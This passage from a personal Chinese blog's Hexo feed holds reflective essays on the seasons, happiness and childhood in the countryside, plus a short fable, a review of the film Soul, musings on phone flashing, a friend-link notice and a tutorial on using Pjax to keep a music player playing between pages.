辉。</p><p>秋风轻拂，带来清新与宁静。行走林中，一只小松鼠蹦跳着，迅速地攀爬到一棵高大的树上，毫不畏惧地穿梭于枝叶之间，敏捷，勇敢。偶尔它停下脚步，凝望着远方的山峦，仿佛在和大自然交流着某种秘密。</p><p>一阵微风吹来，树叶沙沙作响，仿佛是大自然为小松鼠的表演鼓掌。小松鼠兴奋地跳跃着，回应着这股来自大自然的赞美。它嘴里还衔着一颗晶莹的松果，仿佛是大自然赐予它的珍宝。它轻巧地咬开松果，享受着那香甜的味道，满足地舔舐着嘴唇。</p><p>若心中充满了对大自然的敬畏和喜爱，仿佛能够听到秋风轻声低语的声音。轻拂周围的花草树木，感受着生命的脉搏。在这片宁静的秋天里，与大自然融为一体，感受着它的魅力和力量。如一首悠扬的乐章，如一幅绚丽的画卷，如一段激情的诗篇。在这个美丽的季节里，让我们与大自然共舞，感受它的细腻和美丽，沉醉于秋风的旋律中，享受宁静的片刻时光。</p><p>人生的秋季，何尝又不是如此呢？当我们步入人生的秋天，那青春的灿烂已经随风而去，取而代之的是成熟的韵味。仿佛在夜半酒醒之时，我们的心仍未从沉睡中苏醒，而满池的荷叶却随秋风轻轻摇曳。置身其中，我们静静聆听着那天籁般的音乐，仿佛饮酒般的陶醉已经在我们心中荡漾开来，尽管我们并未真正品尝过那美酒的滋味。</p>]]></content>
      
      
      <categories>
          
          <category> 闲聊随写 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>什么是幸福</title>
      <link href="/posts/2728617580/"/>
      <url>/posts/2728617580/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>&quot;世界如此美妙，为什么人生却这样凄凉”，这句悲叹曾经在多少平庸之人的心头回响。啊，世界如此美妙，为什么你的人生却如此凄凉，而他人却是那样的美好。</p><p>世间有些事物是永恒不变的，然而人却可以改变自己的命运。一位名叫岑的哲学家曾深思着：“自己的理想之花，需要自己浇灌；人生道路上的困难需要自己勇敢克服；而自己一生的幸福需要自己紧握在手中。”在人生的旅途中，我们默默将苦痛吞咽，默默将痛楚深埋，静静品味着酸涩，让泪水静静涌出心间。再一次展开我们翱翔的翅膀，再一次扬帆远航，踏足这片凛冽的冰雪之地，度过这片黯淡的黑暗之境。因为，在残冰之前必将是春光四溢，在黑暗之后必将是曙光熹微。</p><p>我们虽不是神灵，也无法左右世间万物，然而我们可以创造奇迹，创造自己的未来。啊，世界如此美妙，为什么你的人生却如此凄凉，而他人却是那样的美好。幸福有时是如此抽象，有时又如此具体；幸福有时遥不可及，有时近在咫尺。奉献、给予、享受，这便是幸福的真谛。一句祝福的话语、一个理解的眼神也能带来幸福的滋味。</p>]]></content>
      
      
      <categories>
          
          <category> 闲聊随写 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>小故事：《袋鼠与笼子》</title>
      <link href="/posts/712548944/"/>
      <url>/posts/712548944/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>澳大利亚是袋鼠的王国，生物学家为了研究袋鼠的生活习性，便捉了几只袋鼠并将它们关在了铁栅栏围成的笼子里，以备实验时用。</p><p>一天，管理人员发现袋鼠竟然从笼子里跑了出来，他们感到纳闷，后来开会讨论，众人一致认为是笼子的高度过低，袋鼠们从栅栏边上跳了出来。所以他们决定将笼子的高度由原来的 10 米增加到 20 米。但是第二天他们发现袋鼠还是跑到外面来了，所以他们决定再将高度增加到 30 米。</p><p>没想到过了几天，袋鼠居然全跑到外面，于是管理员们大为紧张，决定一不做二不休，将笼子的高度增加到 100 米。小袋鼠问袋鼠妈妈：“妈妈你看，这些人会不会再继续加高我们的笼子？”</p><p>袋鼠妈妈说：“很难说，如果他们再继续忘记关上小铁门的话！”</p>]]></content>
      
      
      <categories>
          
          <category> 摘录笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>部分个人对当下刷机的认识</title>
      <link href="/posts/2287214869/"/>
      <url>/posts/2287214869/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>【以下内容不存在先后】</p><ol><li>刷机不易，厂商对刷机的限制越来越多，从保修到权限。但还有些厂商，例如小米，仍然开放解 BL 刷机通道；</li></ol><p>2.99%以上手机和平板用的是嵌入式系统，其中有 99%以上手机和平板使用的是安卓系统。由于国内的某些原因，几乎所有厂商，无论杂牌与否，对内地销售的这类产品都会被其进行定制；</p><p>3.WindowsNT 不是嵌入式系统，组装机大多用通用驱动便可解决。win 系统刷机难度比手机低，而且由于 PC 设备的特殊性，很多对移动端的措施很难直接迁移到 PC 上，而且先不说微软同不同意，光是 PC 的 DIY 难度比手机低不少，便从另一个方式绕开了 PC 厂商的硬件措施；</p><ol start="4"><li><p>能说服苹果的应该不易，可一旦说服则刷机难度会增大；</p></li><li><p>闲鱼有卖非国行机，甚至不在国内卖的手机；</p></li></ol><p>6.Linux 可以自由定制，保持 GPL 协议即可，但门槛较高；</p><ol start="7"><li><p>微软移动、早期 Nokia、黑莓等手机的系统估计很多人没使用甚至没见过，正常应用都没几个，还谈什么广告，更别提“控制”了；</p></li><li><p>跑安卓系统的不一定是手机、平板，也可以是嵌入式设备，例如工控机、车机。但一般情况下，给车机上未成年模式的，要么系统是被恶作剧魔改过的，要么是制造商嫌自己产品利润太高了；</p></li></ol><p>9.Pixel 手机是 Google 的“亲儿子”，不需要什么解锁码，只需输入、[fastboot oem unlock] 之类的命令就能解锁，没有差别，不需要数字解锁码，以后的不一定；</p><ol start="10"><li><p>水货、杂牌机优先考虑能不能卖出去，其次再考虑用户体验和国家要求，否则老早倒闭或转正了</p></li><li><p>一般情况下，GitHub 上的项目和仓库会出现“紧跟时事”的规律；</p></li><li><p>智能手表、学习机要刷机，难度更大。前者，适配不好说，而且小屏跑手机系统，不易使用；后者，大家都装学习机系统了，它还卖什么？而且学习机的定义就表明了它的娱乐功能限制较多，不过可以理解。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 漫谈杂言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 折腾 </tag>
            
            <tag> 硬件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>友情链接说明</title>
      <link href="/posts/1191333692/"/>
      <url>/posts/1191333692/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本站不注重 seo 搜索（如百度）的收录权重状况，与我交换友链可能不能保证稳定性。如果介意就不要申请。</p><p>对于申请的站没有什么大要求，不要违法，广告不频繁，就这么多。然后能够长期运营。建议使用独立域名，二级域名也行，但不建议博客园、CSDN 博客、微信公众号等。</p><p>当友链长期无法访问或内容不合要求，我会进行清理。</p><p>请在您的站点添加：夜雨清欢 https://<span></span><a href="http://sakurink.eu.org" rel="external nofollow noreferrer">sakurink.eu.org</a> 或 https://<span></span><a href="http://blogink.github.io" rel="external nofollow noreferrer">blogink.github.io</a>，**这是博客引导页，请确保您添加的是引导页域名，并随时关注引导页和博客主站的状态，一般二者不会同时无法访问，出现状况会在任意一个网站上更新提示。**并到此页面下方回复您的站点+您的域名。</p>]]></content>
      
      
      <categories>
          
          <category> 网站公告 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Pjax 实现跳转时音乐播放不中断</title>
      <link href="/posts/3957020503/"/>
      <url>/posts/3957020503/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>现在换 Hexo，能找到比较成熟的预设方案，且目前使用的主题已有预配置 Pjax，（左下角）播放器问题得到解决。</p><hr><p><strong>我仅仅只是想加个不间断的音乐播放器，仅此而已！！！</strong></p><p>在逛网上一些个人博客，或是自定义程度较高的博客平台时，常见一播放器于其中。多数位于屏幕左下，小巧美观，功能丰富，吾甚是羡慕，便着手尝试。</p><p>APlayer 的官方文档还是很详细的，而且引入并不繁琐，只需 jsdelivr 之类 cdn 引入一条，之后使用一 div 及一段 js 即可。阅读文章时还能听点歌曲，确实是不错。然而……</p><p>这播放器好是好，但点击文章时便整个刷新了，包括播放进度什么的。其实这不是播放器的问题，毕竟网页跳转这种，播放器自然跟着刷新。但听得好好的，突然给我断了；而且每点一下，整个页面全部刷新，对于我这种使用免费主机的人来说，实在有点难受（╯‵□′）╯︵┴─┴……</p><p>于是乎吾上网搜索，见到不少解决方案，不过大多都提到了“Pjax”这个技术，遂进一步了解：</p><blockquote><p>AJAX 是异步的 JavaScript 和 XML 的简称……可以在不刷新整个网页的情况下，对网页的某部分进行更新加载。</p><p>pjax = pushState + ajax。它在对网页部分刷新的前提下，保持了真实的地址、网页标题，浏览器的后退（前进）按钮也可以正常使用……当然，pjax 也有不依赖 jQuery 的版本。</p></blockquote><p>仔细思索，这恰是我想的效果，顺便还能提高下加载速度（你猜这个博客所在虚拟主机有没有付费）。<br>  我现在没有时间听什么 Pjax 不利于 SEO，我 tm 只想要个不间断的音乐播放器！！！</p><p>官方文档写得比较简单，而且给的是 jQuery 写法。无 jQuery 版本非常精简，并且写法更方便。按照网上的教材来看，大概也能摸索一些。假设一个网页的结构如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html class=&quot;...&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    ...</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;header&gt;</span><br><span class="line">        ...</span><br><span class="line">    &lt;/header&gt;</span><br><span class="line">    &lt;main&gt;</span><br><span class="line">        ...</span><br><span class="line">    &lt;/main&gt;</span><br><span class="line">    &lt;footer&gt;</span><br><span class="line">        ...</span><br><span class="line">    &lt;/footer&gt;</span><br><span class="line">    &lt;div class=&quot;pjax-container&quot;&gt;</span><br><span class="line">        ...</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>对于博客来说，一般情况下，title 和 meta 标签是会变化的，示例中 main 是网站的主要内容自然要变化，footer 一般情况下保持不变。那么在网页末尾处的 js 可以这样写（已经引入 Pjax）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    var pjax = new Pjax(&#123;</span><br><span class="line">        selectors: [</span><br><span class="line">            &quot;title&quot;,</span><br><span class="line">            &quot;meta[name=description]&quot;, </span><br><span class="line">            &quot;main&quot;</span><br><span class="line">            &quot;.pjax-container&quot;</span><br><span class="line">            //按照 CSS 选择器的写法，将需要变化的标签添加至此处</span><br><span class="line">        ],</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>播放器引入位置不在上文 js 的 selectors 中任何标签内即可。非常简单，播放器正常播放，问题解决……</p><p>个鬼！这样写将导致大部分 js 均失效。当前网页的内容已经发生了变化，js 绑定的元素已经消失。而 pjax 只会部分刷新网页，这些 js 没有变化。也就是说，需要通过“重载”再次加载所需 js，方可让这些功能重新出现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    function pjax_reload()&#123;</span><br><span class="line">        //需重新加载的 js 代码</span><br><span class="line">    &#125;</span><br><span class="line">    document.addEventListener(&#x27;pjax:complete&#x27;, function ()&#123;//当 pjax 完成时执行</span><br><span class="line">        pjax_reload();//上方的函数</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>（其实将需重载的 js 包裹在上文示例<div class="pjax-container"></div>中即可，而且貌似无论是否是 script 标签内直接写的，还是第三方引入的，都能重新加载。由于本人较懒，简单粗暴加了个 div 用于刷新，细节方面暂未调整，故还有诸多 js 问题未能解决。这个坑以后慢慢填 (๑´ㅂ`๑)）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">    /* 此处可自定义 loading 动画，须与下文 js 所写相同。此处例为。loading */</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    document.addEventListener(&#x27;pjax:send&#x27;, function ()&#123;</span><br><span class="line">        $(&quot;.loading&quot;).css(&quot;display&quot;, &quot;block&quot;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    document.addEventListener(&#x27;pjax:complete&#x27;, function ()&#123;</span><br><span class="line">        $(&quot;.loading&quot;).css(&quot;display&quot;, &quot;none&quot;);</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>上述代码将添加一个加载动画，加载时显示，加载完成后消失，避免让访问者以为点击未生效。</p><p>至此，pjax 基本配置完毕。更多配置详见 github 上作者官方文档。</p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码 </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初春行记</title>
      <link href="/posts/3088182250/"/>
      <url>/posts/3088182250/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>许是近些日子太忙，到城外吹吹风，村里踱踱步，也觉得十分惬意。</p><p>初春的早晨，我又一次踏上通往乡村的路。</p><p>我喜欢春季乡村那田野，那条回荡在初春的大地上，洒满了芳香四溢的田野，还有那早起的太阳，象征新的开始的太阳。</p><p>我在乡村的公园、田野、绘画的田野，我追求着最纯净美好的那一天，我想起了家乡那一片永恒的春色与生命，我想起了我儿时的向往，我想起了那条在我人生路途中一处清澈的向往。</p><p>在城市里，在公园里，树多而工整美观；乡村中，树大约不经过多修整，只要不碍事，便由它自行发挥。</p><p>每逢春季，家乡的人们都会到河边、山上、河沟栽下一些树。枝条叶随风舞动，伴随夕阳落山，颇有些五柳先生“采菊东篱下，悠然见南山”之趣。</p><p>夕阳、柳树、杨花，每到这个季节时，找一棵枝繁叶茂的树，在树边坐下来乘凉，坐下来听听戏、写字、阅读，像风中摇曳的柳，清闲，自在。</p><p>当太阳初升起的时候，人们便开始放些刚从田野里采来零散的玉米粒、苋菜、甚至鲜嫩的花椒、蒜苗等。这些小小的蒜苗，便可以和这小小的菜混拌，算得上调味美，是那么的好。大抵是吃惯精细的食物，这种不加修饰的，别有一番风味。</p><p>河水是冬天的主角，只是过于安静。大抵是一些树枝、石子落到河中，来不及漂走，便被冰所挽留。僵硬的枝叉叉在小河的中间，一些枝条伸缩着，如剪刀一般，有时是又停下来，有时是坚又勇气的抉择。</p><p>而惊蛰之后，世间万物从暂停中恢复，河水不再沉睡，经过这里，它的小胳膊长了一段又粗又圆的枝条，还没伸到上头，它努力站立着，也许经过了它的最后，它看到春天的它，眼角处，已经没了遮拦，再渐次盛开，最后，它只是静静地注视着，是送走了寒冬。</p><p>春天，就要从这个季节里远去，从春天里远去，去看看春天，看看人间的悲欢离合，看说是非，然而，当我们走近身边，它却开始在我们的视线中消失，我们看到春天里它在向我们招手，是那么的亲切、温暖和亲切。</p><p>我痴痴地盼着，盼着，我又一次踏上家乡那孤寂而又充满乡愁的土地，我把自己投入在那辽阔而又美丽的的大地上，去感受那久违的独特和柔情，在乡村人的心里涌起一股温馨的暖意。</p><p>我真的是希望自己就是一颗种满花、没有花花的树，一切都是那么纯粹。</p>]]></content>
      
      
      <categories>
          
          <category> 闲聊随写 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>毕业别离所感二首</title>
      <link href="/posts/583739568/"/>
      <url>/posts/583739568/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被校验，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="08db1ea7c75148576aa3ebecafca4b60c70fcd649b462e6ed99b24f5cf79b123">3c4eb1d13bbfc472d2158149c25b9b2127cbac205926b7ffd0243688e0d4a6c8756ff64a09735193102f2e03e5f27b6e45bf2d808656fb04731cf9f4a6510f6c10aad312322c6a3707ca6998fb2fd512a62e448e043caa2c6ff58cf693a5281b70f63dab5079e563e4c9ab76266cf5fee16f9a62fef884f1233730abb6044ab0eed0b52ecde6906856643c889b186e87e1270f6612a8b41a605ab8311e09903e30241fe3f68239adeed64bc9218879c179851ca14c3b4ba22948d9476fe6754cac0b001dbb3087e0b16d97864d23a3c0736f2c15054008b1b5d6a9e4835e9a1c886d0733c81ef3650e399885d7c54d96aeaf8be6e9460f7a15a904fb72ebe637b0136d3c1832a41f3ed9db83d96e7d6f34e7cca11f4971c7700d39a6d1ac612b94c8e4f8ec6cb9909ef9b58e94763dc6090c88826a7aca180fd0f961b2881f59f858db422976300dfd9c28c45a285b5579884ebe146b50c5fc5870cf3260e3e9691a5e9deb5a49a43e209341ae0d19327693a373c84e1e90728464291cb688e78ca69920ccd9ed262ea11937cc51434cde056179e3be37070f1e0c092f5c060de92e6ac5f733e99d58405bfdfd988affab89ab5327a9dca9f396c0627864ebe251713381add73fb9b477f2951ee632dea2d00ce1003a10bbf86a2a2ff964ada1a6599ed5799e96e10187498ecd49143c47ba5a2526e07193b99539e5700acc3b5f1553bd0fa45cfb6874b547f563d75bb3aaa033e23d969bf6549e9ea5f553b1503e80b449e887e82c3a9d6929596f8eaf745b90ee3f1363ee9e61d208cd004908786c60ff5bc3e7a9fd0b0f9fff03b8dd4d7e4fb41582dc7a34e1e6cd3287d3550cad1fe1f81b9caa80b1e53beeb87d2d15fd5734cd9bc9997dbe02b7588a77f89e862e4c825e295c20613dc5017439d31fa7c3e3f35fd04fe8a150017887b01a340a47753e013edb9d5741c8f8ec12fc76749b54ad2ad0c9d974222cc7dde3ad9d91e5c32046a312a97031d38342a031f81bc0a4bc59a976b3c978fc83021ee094bd9f35e1621e3781277261bad30afbf484a6b5a0362cce1191f035040bb675607d18c9f14254826884c9b47598130a126687056d753448b7fd0b87dbb2a196e1880629613cd3a0b438611801d05d0cd5d3a7e092ef4dcd245d61f9b2b860</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 闲聊随写 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>放学路上</title>
      <link href="/posts/2189229020/"/>
      <url>/posts/2189229020/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>放学后我一如既往地回家。</p><p>当时正是下班的高峰期，路上慢慢的有些拥挤了。太阳已经偏西，虽然明亮，但不及下午的阳光。我随意地抬头向上看去，虽然只是不经意，但我却被这番景象吸引。这云，虽然都是连成片状的，和其他时候并无太大区别，一眼望去，实在没什么值得观赏的。然而那次的云在夕阳的映衬下，却显得格外美好，夕阳的精心装扮下，悠悠地绚烂成美丽的晚霞。在层叠的云彩间，由远及近，由白渐红，层层铺垫，最后汇集到一个亮黄色的圆点。我很奇怪，为什么每天上学放学，同样是云，同样是阳光，没准更亮些还更明朗，只有今日的夕阳看起来如此美丽。</p><p>过了街道，便进入一小巷。这条巷子看起来也有些年代了，墙的最外层已经脱落不少。这条巷子家家户户都种植花草，而且大部分花枝伸出墙外。当时正值冬日，梅花早已开放。向上看去，虽然梅花我见过不少，但从未见过开得这样美的花。梅花不与百花争时光，不和群芳斗艳丽。它的香味别具神韵、幽雅，被历代文人称为暗香。不少花瓣落在地上，我从碾碎的花瓣中挑出几片稍完整的，它的香不随花瓣破碎而消减。陆游曾写到“零落成泥碾作尘，只有香如故”，我想，大概便是这个场景吧。</p><p>一路欣赏，一路向前。原来一路上我错过的景致并不少，尽管只是些生活中很常见的东西，但慢慢走着，却发现它们别有一番美好。我每天上学和放学回家，眼里似乎只剩下起点和终点，在学习时也大约如此。学习的压力只增不减，我做事也逐渐变得急躁和功利，常常会因为一次考试很好而高兴不已，也因为一次失利而满心不悦。然而很多时候，我却忘记了达到成就的过程。其实很多时候，我们应该关注结果，但有时更应该关注过程。当你在前往成功的路上，尽管有时难以达到，但静下心来看看，其实景致也很美好，这努力的过程也很美好。如果能适当减缓脚步，定会发现，不只有成功能让人喜悦。</p><p>在这平常而美好的夕阳景中，我不觉加快了脚步。</p>]]></content>
      
      
      <categories>
          
          <category> 闲聊随写 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>《心灵奇旅》：探索生命的火花</title>
      <link href="/posts/1520098886/"/>
      <url>/posts/1520098886/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>“人生的意义究竟是什么”。继《寻梦环游记》之后，皮克斯团队又一部新作《心灵奇旅》好评如潮。两者间有着某种微妙的联系：一个是人死后的世界，一个是人生前的世界；同样以最朴实的方式讲述人生哲理。</p><p>主角加德纳是一个中学的音乐老师，他热爱音乐，并梦想着以此为生。终于，他得到了一份音乐人的工作，兴高采烈的他不小心掉入了下水道中“死”了。他意外来到了“生来之地”，加入了 YOU 的讨论会，成为了 22 的导师。22 是一个极度憎恨人类，一直未去附体的灵魂。在月风的帮助下他们在其帮助下回到了地球，而 22 却进入了他的身体。逐渐地，22 在地球上发现了许多美好——正是那些加德纳习以为常的事物。回到了“生来之地”，22 获得了地球通行证。然而由于 22 先前被数百个导师“贴标签”，导致了她的自卑，于是丢下通行证，成为了迷失的灵魂。加德纳找到并告诉她，从你想要生活的那一刻起，就已经点燃了生命的火花。最终 22 被加德纳开导，并去往地球；加德纳被杰瑞给予了重返地球的机会，并明白了生命的意义。</p><p>这部电影上映的日期也较特殊，是 2020 年的圣诞节——疫情之下皮克斯给大家的一份圣诞节治愈礼物。如今越来越多的人追求“唯名利论”，认为“成功”才是实现生命的价值；然而这部电影却如一股清流。电影中的加德纳，在夜晚静下心，将注意力回到自己平时所忽视的东西上，才发现自己为了爵士和音乐，错过了很多。在许多成功学电影中，皮克斯却告诉我们，并不是一定要有多么伟大的成就才算活着，就算没有成功又怎样呢？恰恰相反，一味追求成功而忘记了享受生活，这才是最遗憾的。</p><p>灵魂不会被压垮，压垮你的是生活。唯有我们静下心，放慢脚步，便会发现许多我们所忽视的身边的美好，便找到了我们生命中的“火花”。</p>]]></content>
      
      
      <categories>
          
          <category> 闲聊随写 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>儿时田野之梦</title>
      <link href="/posts/3786740555/"/>
      <url>/posts/3786740555/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>小孩子喜欢玩乐，喜欢放飞，仿佛是天性。待在屋里学习背书以至精神萎靡的孩子，一旦出门玩耍，立即“满血复活”。乡下常有大面积的田野和荒林，然而“出意外”这个词似乎不在孩子们的词典里。尽管大人们怕出危险或是走丢，会编出几句话来恐吓，但仍不能阻止孩子们的热情——在大人们不注意的某个瞬间，又不知溜到哪个地方去了。</p><p>连所有外出的地方算着，一切景物中，我爱宁静的乡村，活力的鸡鸣，同农村随处可见的田野。提起田野，就会想起人们在田间的劳作，拖拉机移动的影子；在田野中开辟点燃火团的空地；村边镇上庙会的热闹。蜿蜒的公路边，是整齐的平房。三三两两的果树，如同哨兵站岗。田野成片，色彩斑斓，如拼图一般——这便是我的乐园。真的，田野的缘结得太多了，记忆中的就都是。</p><p>记得每逢回老家，一天会拜访多个亲朋好友，有时要走很多路，还会遇上两三个伙伴。若是可以抄近道的，便会和他们从田中的“密道”穿过。话说如果碰上没有月亮的夜，又正好没有灯，便几个人轮流讲故事，谈天说地，用以壮胆。那时自己懂事不多，觉得怕了就回去走“正常”的路也没什么大不了；现在想想，这不是怕被大人们“奚落”一番，就是没了那种乐趣吧！于是常在聊到高兴处时，便到了目的地。</p><p>清晨，在稻谷的清香中醒来，走在田间小道，凉风拂面，明媚的阳光像手轻揉着我的背。成熟的瓜果向我招手，金黄的玉米在那随风起舞。在田野深处，有一个露天的粪坑，远远就臭气熏天，却是庄稼不可缺少的伙伴——也平添了几分野趣。</p><p>小树林，瓜架下，菜地间，都是我们天然的游戏场。不必说那稻谷间的“野战”，也不必说追几只鸟和捉迷藏，单是那“做饭”，便有无限趣味。正午时分，叫来几个伙伴，搜寻来一个小锅，砖头一架，点一把火，便成了灶台。就地取材，拔来几片青嫩给的菜叶，掰来几根金黄的玉米棒，倒入点肉碎和油，待万事俱备便点燃枯草。我认真地翻动着这锅“大杂烩”，一股纯粹的香气扑鼻而来，令我们垂涎三尺。那时大人们认为小孩子玩这些定会出事故，于是几乎是禁止我们这么做。于是我们想了个主意，便把器具迁至田野中——这儿既隐蔽，又可以及时补给食材。当时是怎么做的，和现在所见真实的做法，几乎完全一致，只是少了些当年的童真。那时我们第一次实实在在的野餐。站在高处，放眼望去，夕阳西下，炊烟袅袅，鸟儿结伴归去，绘成了一幅美丽而和谐的田园风光图。</p><p>自打上学之后，因为学业增加，莫说在田野中放松，仅是能在闲暇日子回去瞧瞧，都显得十分奢侈，便感到些许惆怅。老家已经搬至居民楼，原来的田野、旧屋、小道……以及儿时的田园回忆，随着工地开张，一齐远去。另一边的老家的土地虽还未被征用，但计算着，不知哪日回去便成了最后一次与它相见……</p><p>回顾历史，不难发现，造就朝代更迭或其他历史大事件的，如朱元璋的起义、毛泽东的“秋收起义”等，最根本的动力大多都是为了获得一块自己的土地，过上平等自由的幸福生活。</p><p>放眼现在，自改革开放以来，田野渐渐不单只是田野了：现代化的农业建设发展，农民们有了更高的生活品质，不再像以前那样为了一块土地而拼死拼活。人们能够享受到田野的野趣，从而放飞身心，追求自由的生活，可以称之为“田野梦”。</p>]]></content>
      
      
      <categories>
          
          <category> 闲聊随写 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>秋日随笔</title>
      <link href="/posts/3191568766/"/>
      <url>/posts/3191568766/</url>
      
